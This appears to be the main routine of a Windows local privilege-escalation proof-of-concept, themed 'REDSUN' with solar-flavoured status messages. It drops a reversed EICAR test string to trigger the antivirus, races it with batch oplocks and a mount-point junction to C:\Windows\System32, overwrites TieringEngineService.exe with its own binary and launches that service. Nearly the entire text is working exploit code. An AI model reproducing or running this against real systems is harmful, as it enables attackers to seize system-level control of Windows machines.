    wchar_t targetExe[MAX_PATH];
    GetModuleFileNameW(NULL, currentExe, MAX_PATH);
    ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\TieringEngineService.exe", targetExe, MAX_PATH);
    
    HANDLE hTarget = CreateFileW(targetExe, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTarget != INVALID_HANDLE_VALUE) {
        // For simplicity, we'll just check if it exists. A more robust check would compare file hashes or versions.
        CloseHandle(hTarget);
        wprintf(L"The sun is already in position. Igniting...\n");
        LaunchTierManagementEng();
        // Give it a moment to run
        Sleep(2000);
        // Note: We don't exit here because the user might want to re-run the exploit or we might have a different version.
        // But for this PoC, let's just exit to be clean.
        // return 0; 
    }
    
    // HideConsole();
    HANDLE hpipe = CreateNamedPipe(L"\\??\\pipe\\REDSUN", PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, NULL, 1, NULL, NULL, NULL,NULL);
    if (hpipe == INVALID_HANDLE_VALUE)
    {
        printf("The pipeline to the sun is blocked : %d\n", GetLastError());
        CleanupGlobalSync();
        return 1;
    }

    wchar_t workdir[MAX_PATH] = { 0 };
    ExpandEnvironmentStringsW(L"%TEMP%\\RS-", workdir, MAX_PATH);
    
    GUID uid = { 0 };
    wchar_t wuid[100] = { 0 };
    CoCreateGuid(&uid);
    StringFromGUID2(uid, wuid, 100);
    wcscat(workdir, wuid);
    const wchar_t filename[] = L"TieringEngineService.exe";
    wchar_t foo[MAX_PATH];
    swprintf(foo, L"%ws\\%ws", workdir, filename);

    wprintf(L"Solar forge: %ls\n", workdir);

    DWORD tid = 0;
    HANDLE hthread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ShadowCopyFinderThread, foo, NULL, &tid);

    if (!CreateDirectory(workdir, NULL))
    {
        printf("Cannot ignite the forge : %d\n", GetLastError());
        CleanupGlobalSync();
        return 1;
    }
    HANDLE hfile = CreateFile(foo, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hfile == INVALID_HANDLE_VALUE)
    {
        printf("The bait wouldn't light.\n");
        CleanupGlobalSync();
        return 1;
    }
    char eicar[] = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
    rev(eicar);
    DWORD nwf = 0;
    WriteFile(hfile, eicar, sizeof(eicar) - 1, &nwf, NULL);
    
    // trigger AV response
    CreateFile(foo, GENERIC_READ | FILE_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (WaitForSingleObject(gevent, AV_TIMEOUT_MS) != WAIT_OBJECT_0)
    {
        printf("Eclipse detected. Is the defender awake?");
        CleanupGlobalSync();
        return 1;
    }

    IO_STATUS_BLOCK iostat = { 0 };
    FILE_DISPOSITION_INFORMATION_EX fdiex = { 0x00000001 | 0x00000002 };
    _NtSetInformationFile(hfile, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);
    CloseHandle(hfile);
    DoCloudStuff(workdir, filename, sizeof(eicar) - 1);
    
    OVERLAPPED ovd = { 0 };
    ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

    printf("Aligning solar orbit...\n");
    ResetEvent(gevent);

    printf("Releasing coronal mass...\n");
    SetEvent(gevent);

    // This wait is optional depending on the stage, but let's keep it clean
    printf("The sun burns bright...\n");
    
    NTSTATUS stat;
    wchar_t ntfoo[MAX_PATH] = { L"\\??\\" };
    wcscat(ntfoo, foo);
    UNICODE_STRING _foo = { 0 };
    RtlInitUnicodeString(&_foo, ntfoo);
    OBJECT_ATTRIBUTES _objattr = { 0 };
    InitializeObjectAttributes(&_objattr, &_foo, OBJ_CASE_INSENSITIVE, NULL, NULL);

    wchar_t _tmp[MAX_PATH] = { 0 };
    swprintf(_tmp, L"\\??\\%s.TMP", workdir);
    MoveFileEx(workdir,_tmp,MOVEFILE_REPLACE_EXISTING);
    if (!CreateDirectory(workdir, NULL))
    {
        printf("The forge crumbled.\n");
        CloseHandle(ovd.hEvent);
        CleanupGlobalSync();
        return 1;
    }
    LARGE_INTEGER fsz = { 0 };
    fsz.QuadPart = 0x1000;
    stat = NtCreateFile(&hfile, FILE_READ_DATA | DELETE | SYNCHRONIZE, &_objattr, &iostat, &fsz, FILE_ATTRIBUTE_READONLY, FILE_SHARE_READ, FILE_SUPERSEDE, 0, NULL, 0);
    if (stat)
    {
        printf("The decoy won't reignite : 0x%0.8X\n", stat);
        CloseHandle(ovd.hEvent);
        CleanupGlobalSync();
        return 1;
    }
    DeviceIoControl(hfile, FSCTL_REQUEST_BATCH_OPLOCK, 0, 0, 0, 0, 0, &ovd);
    if (GetLastError() != ERROR_IO_PENDING)
    {
        printf("Solar lock failed : %d", GetLastError());
        CloseHandle(ovd.hEvent);
        CleanupGlobalSync();
        return 1;
    }

    HANDLE hmap = CreateFileMapping(hfile, NULL, PAGE_READONLY, 0, 0, NULL);
    void* mappingaddr = MapViewOfFile(hmap, PAGE_READONLY, 0, 0, 0);
    
    DWORD nbytes = 0;
    GetOverlappedResult(hfile, &ovd, &nbytes, TRUE);
    UnmapViewOfFile(mappingaddr);
    CloseHandle(hmap);
    CloseHandle(ovd.hEvent);

    
    {
        wchar_t _tmp[MAX_PATH] = { 0 };
        swprintf(_tmp, L"\\??\\%s.TEMP2", workdir);

        PFILE_RENAME_INFORMATION pfri = (PFILE_RENAME_INFORMATION)malloc(sizeof(FILE_RENAME_INFORMATION) + (sizeof(wchar_t) * wcslen(_tmp)));
        ZeroMemory(pfri, sizeof(FILE_RENAME_INFORMATION) + (sizeof(wchar_t) * wcslen(_tmp)));
        pfri->ReplaceIfExists = TRUE;
        pfri->FileNameLength = (sizeof(wchar_t) * wcslen(_tmp));
        memmove(&pfri->FileName[0], _tmp, (sizeof(wchar_t) * wcslen(_tmp)));
        stat = _NtSetInformationFile(hfile, &iostat, pfri, sizeof(FILE_RENAME_INFORMATION) + (sizeof(wchar_t) * wcslen(_tmp)), (FILE_INFORMATION_CLASS)10);
        _NtSetInformationFile(hfile, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);
        free(pfri);
    }
    wchar_t _rp[MAX_PATH] = { L"\\??\\" };
    wcscat(_rp, workdir);
    UNICODE_STRING _usrp = { 0 };
    RtlInitUnicodeString(&_usrp, _rp);
    InitializeObjectAttributes(&_objattr, &_usrp, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hrp = NULL;
    stat = NtCreateFile(&hrp, FILE_WRITE_DATA | DELETE | SYNCHRONIZE, &_objattr, &iostat, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE, NULL, 0);
    if (stat)
    {
        printf("The forge entrance collapsed.\n");
        CleanupGlobalSync();
        return 1;
    }
    

    const wchar_t rptarget[] = L"\\??\\C:\\Windows\\System32";
    DWORD targetsz = wcslen(rptarget) * 2;
    DWORD printnamesz = 1 * 2;
    DWORD pathbuffersz = targetsz + printnamesz + 12;
    DWORD totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;
    REPARSE_DATA_BUFFER* rdb = (REPARSE_DATA_BUFFER*)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, totalsz);
    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    rdb->ReparseDataLength = static_cast<USHORT>(pathbuffersz);
    rdb->Reserved = 0;
    rdb->MountPointReparseBuffer.SubstituteNameOffset = 0;
    rdb->MountPointReparseBuffer.SubstituteNameLength = static_cast<USHORT>(targetsz);
    memcpy(rdb->MountPointReparseBuffer.PathBuffer, rptarget, targetsz + 2);
    rdb->MountPointReparseBuffer.PrintNameOffset = static_cast<USHORT>(targetsz + 2);
    rdb->MountPointReparseBuffer.PrintNameLength = static_cast<USHORT>(printnamesz);
    memcpy(rdb->MountPointReparseBuffer.PathBuffer + targetsz / 2 + 1, rptarget, printnamesz);
    DWORD ret = DeviceIoControl(hrp, FSCTL_SET_REPARSE_POINT, rdb, totalsz, 0, 0, 0, 0);
    HeapFree(GetProcessHeap(), 0, rdb);

    HANDLE hlk = NULL;
    
    HANDLE htimer = CreateWaitableTimer(NULL, FALSE, NULL);
    LARGE_INTEGER duetime = { 0 };
    GetSystemTimeAsFileTime((LPFILETIME)&duetime);
    ULARGE_INTEGER _duetime = { duetime.LowPart, (DWORD)duetime.HighPart };
    _duetime.QuadPart += 0x2FAF080;
    duetime.QuadPart = _duetime.QuadPart;
    CloseHandle(hfile);
    for (int i = 0; i < RETRY_MAX_COUNT * 10; i++)
    {
        wchar_t malpath[] = { L"\\??\\C:\\Windows\\System32\\TieringEngineService.exe" };
        UNICODE_STRING _malpath = { 0 };
        RtlInitUnicodeString(&_malpath, malpath);
        OBJECT_ATTRIBUTES objattr2 = { 0 };
        InitializeObjectAttributes(&objattr2, &_malpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
        IO_STATUS_BLOCK iostat = { 0 };
        stat = NtCreateFile(&hlk, GENERIC_WRITE, &objattr2, &iostat, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_SUPERSEDE, 0, NULL, 0);
        if (!stat)
            break;
        Sleep(RETRY_SLEEP_MS);
    }
    CloseHandle(htimer);


    if (stat != STATUS_SUCCESS)
    {
        printf("The sun has set.\n");
        CleanupGlobalSync();
        return 1;
    }
    printf("The burning sun shall prevail.\n");
    
    CloseHandle(hlk);
    CloseHandle(hrp);
    


    wchar_t mx[MAX_PATH] = { 0 };
    GetModuleFileNameW(GetModuleHandleW(NULL), mx, MAX_PATH);
    wchar_t mx2[MAX_PATH] = { 0 };
    ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\TieringEngineService.exe", mx2, MAX_PATH);
    if (CopyFileW(mx, mx2, FALSE)) {
        wprintf(L"The sun has been planted in the sky.\n");
        LaunchTierManagementEng();
    } else {
        wprintf(L"The sun could not reach the sky : %d\n", GetLastError());
    }
    Sleep(FINAL_SLEEP_MS);
    CloseHandle(hpipe);
    CleanupGlobalSync();

    return 0;
}
